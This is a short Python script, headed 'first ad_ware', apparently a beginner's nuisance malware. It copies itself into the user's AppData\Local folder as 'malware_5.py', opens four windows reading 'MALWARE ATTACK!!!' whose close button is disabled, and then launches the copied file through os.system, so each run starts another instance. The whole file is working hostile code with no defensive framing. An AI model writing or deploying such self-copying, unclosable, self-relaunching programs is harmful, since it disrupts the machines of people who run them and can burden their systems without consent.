# first ad_ware

import os
import shutil
import sys
import random
from PySide6 import QtCore, QtWidgets

original_src = os.path.abspath(__file__) # get current file path
source = original_src # store it

def change_dir():
    user_name = os.getlogin()
    dst = os.path.join(rf'C:\Users\{user_name}\AppData\Local', 'malware_5.py') # create a destination
    
    # If the script is not already running from the destination directory
    if original_src != dst:
        print("Original Source:", original_src)
        print("Destination:", dst)
        
        # Copy the file only if it doesn't already exist
        if not os.path.exists(dst):
            shutil.copy(original_src, dst)
            print(f"Copied file to {dst}")
        
        return dst  # Return the destination path for later use
    else:
        print("GOOD DIRECTORY CHAT")
        return None

class MyWidget(QtWidgets.QWidget):  # responsible for all the gui, you can find its official documentation
    def __init__(self, label_text):
        super().__init__()
        self.text = QtWidgets.QLabel("MALWARE ATTACK!!!", alignment=QtCore.Qt.AlignCenter)
        self.layout = QtWidgets.QVBoxLayout(self)
        self.layout.addWidget(self.text)

    # Override the closeEvent method to prevent closing
    def closeEvent(self, event):
        event.ignore()  # Prevent closing the window

if __name__ == "__main__":
    dst = change_dir()  # Execute the file handling first

    app = QtWidgets.QApplication(sys.argv)

    # Create and show four separate windows with random coordinates
    coordinates = [(random.randint(100, 800), random.randint(100, 600)) for _ in range(4)]

    windows = []
    for i, (x, y) in enumerate(coordinates):
        widget = MyWidget(f"Window {i+1}") 
        widget.setWindowTitle(f"Window {i+1}")  
        widget.resize(300, 200)
        widget.move(x, y)
        widget.show()  
        windows.append(widget) 

    # Run the copied file if it was created
    if dst:
        final = os.system("python " + dst)
        print(f"Execution of destination file returned: {final}")

    sys.exit(app.exec())
